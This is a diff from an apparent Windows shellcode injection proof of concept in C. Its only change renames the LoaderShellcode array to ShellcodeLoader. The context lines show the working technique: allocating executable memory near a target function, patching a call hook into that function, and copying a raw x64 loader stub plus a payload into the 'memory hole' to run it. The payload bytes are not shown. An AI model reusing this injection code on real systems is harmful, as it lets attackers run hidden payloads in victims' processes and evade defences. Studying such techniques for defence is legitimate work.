@@ -30,12 +30,12 @@ int main() {
 						MaxBoundary;
 	void*				pShellcodeInTheHole = 0;
 	char				FunctionHook[]		= { 0xE8, 0x00, 0x00, 0x00, 0x00 },
-						LoaderShellcode[]   = { 0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
+						ShellcodeLoader[]   = { 0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
 												0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
 												0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
 												0xE0, 0x90 };
 
-						MaxBoundary         = 0x70000000 - ( sizeof(LoaderShellcode) + sizeof( shellcode ) );	// Maximum search range up or down. Leave enough room for payload if search goes that far.
+						MaxBoundary         = 0x70000000 - ( sizeof(ShellcodeLoader) + sizeof( shellcode ) );	// Maximum search range up or down. Leave enough room for payload if search goes that far.
 
 
 	/*
@@ -64,7 +64,7 @@ int main() {
 	/* Allocate memory beginning at start address & incrementing by boundary size until memory is allocated */
 	while ( StartAddress < ( pTargetFunction + MaxBoundary ) ) 
 	{
-		if ( ( pShellcodeInTheHole = VirtualAlloc( ( LPVOID )StartAddress, sizeof(LoaderShellcode) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) != NULL )
+		if ( ( pShellcodeInTheHole = VirtualAlloc( ( LPVOID )StartAddress, sizeof(ShellcodeLoader) + sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) != NULL )
 		{
 			break;
 		}
@@ -123,7 +123,7 @@ int main() {
 					35: ff e0                   jmp    rax
 				  shellcode:
 	*/
-	memcpy( &LoaderShellcode[18], ( unsigned long long* )pTargetFunction, sizeof( unsigned long long) );
+	memcpy( &ShellcodeLoader[18], ( unsigned long long* )pTargetFunction, sizeof( unsigned long long) );
 
 	/*
 		Step 3: Insert the hook into our target function. This hook is a secondary shellcode which jumps to our
@@ -149,8 +149,8 @@ int main() {
 	}
 
 	/* Step 4: Now we need to write the loader & shellcode into the memory hole. The loader will be added first, followed by the main payload. */
-	memcpy( pShellcodeInTheHole, &LoaderShellcode, sizeof(LoaderShellcode) );
-	memcpy( ( void* )( ( unsigned long long )pShellcodeInTheHole + sizeof( LoaderShellcode ) ), &shellcode, sizeof( shellcode ) );
+	memcpy( pShellcodeInTheHole, &ShellcodeLoader, sizeof(ShellcodeLoader) );
+	memcpy( ( void* )( ( unsigned long long )pShellcodeInTheHole + sizeof( ShellcodeLoader ) ), &shellcode, sizeof( shellcode ) );
 	
 	printf("[+] Copied loader & main shellcode to memory hole. Executing payload!\n");
 
